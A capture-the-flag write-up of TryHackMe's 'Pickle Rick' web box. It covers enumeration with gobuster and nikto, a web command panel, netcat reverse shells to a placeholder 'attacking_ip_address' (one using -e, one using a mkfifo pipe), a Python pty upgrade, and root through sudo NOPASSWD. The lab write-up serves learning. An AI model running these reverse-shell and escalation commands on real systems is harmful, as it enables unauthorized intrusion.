CTF Write-up: Pickle Rick

Introduction

Web exploitation CTF on TryHackMe, themed around the Rick and Morty cartoon.

Objective

Exploit a web server and recover three flags hidden across user contexts on the box.

Setup

Connect via the TryHackMe VPN.

Step One - Inspect the Source

View the source of the landing page. An HTML comment exposes the username "R1ckRul3s".

Step Two - Enumeration

Run gobuster against the web root for directory and file discovery:

$ gobuster dir -u http://10.10.236.162 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 64 -o rickCtfDirScan.txt 2>/dev/null

Run Nikto for headers and sensitive file detection:

$ nikto -h http://10.10.236.162 -o rickCtfNiktoScan.txt

Gobuster identifies a "robots.txt" file. Standard use of "robots.txt" is to give crawler directives, but here the contents are non-standard:

Step Three - A Reverse Shell

The post-login page presents a "Command Panel" form input. Submit "whoami":

This is a web shell running as "www-data" — the standard low-privilege user for web server processes. Convert it into a reverse shell.

Start a listener locally:

$ sudo nc -lvnp 444

First attempt — direct netcat with "-e":

nc attacking_ip_address 444 -e /bin/bash

No connection. Modern netcat builds (notably "netcat-openbsd") compile out the "-e" option by default — direct command execution flags are a primary reverse-shell vector and have been removed from default builds for that reason.

Confirm netcat itself can still reach the listener (without "-e"):

nc attacking_ip_address 444
$ sudo nc -lvnp 444
Listening on 0.0.0.0 444
Connection received on 10.10.236.162 37146

Connection established. Replace the bare connection with a reverse shell using a named pipe to redirect stdin, stdout, and stderr through netcat:

mkfifo /tmp/f; nc attacking_ip_address 444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
$ sudo nc -lvnp 444
Listening on 0.0.0.0 444
Connection received on 10.10.236.162 37260
whoami
www-data

The shell works but lacks job control and proper terminal behaviour. Upgrade to a pseudo-terminal via Python — "python3" is generally available on Linux targets:

python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ip-10-10-236-162:/var/www/html$

Set "TERM" to handle screen clearing and other terminal escape sequences:

export TERM=xterm

Step Four - Privilege Escalation

Check sudo permissions for "www-data":

User www-data may run the following commands on ip-10-10-236-162:
    (ALL) NOPASSWD: ALL

"(ALL) NOPASSWD: ALL" — this user can run any command as any user without a password. Escalate to root with "sudo /bin/bash":

root@ip-10-10-236-162:/var/www/html#

Solution

First flag:

root@ip-10-10-236-162:/var/www/html# cat Sup3rS3cretPickl3Ingred.txt

Second flag:

root@ip-10-10-236-162:/home/rick# cat 'second ingredients'

Third flag — from ".bash_history" of the "ubuntu" user:

root@ip-10-10-236-162:/home/ubuntu# nano .bash_history

Conclusion

Standard initial-foothold-to-root chain on a deliberately misconfigured web app: HTML source comment exposes the username, "robots.txt" exposes the password, an authenticated form provides command execution, and "(ALL) NOPASSWD: ALL" in sudoers gives root in one step. Useful as a baseline reminder that thorough enumeration of obvious surfaces — HTML source, "robots.txt", post-auth functionality, "sudo -l" — often outperforms clever exploitation when working initial foothold.
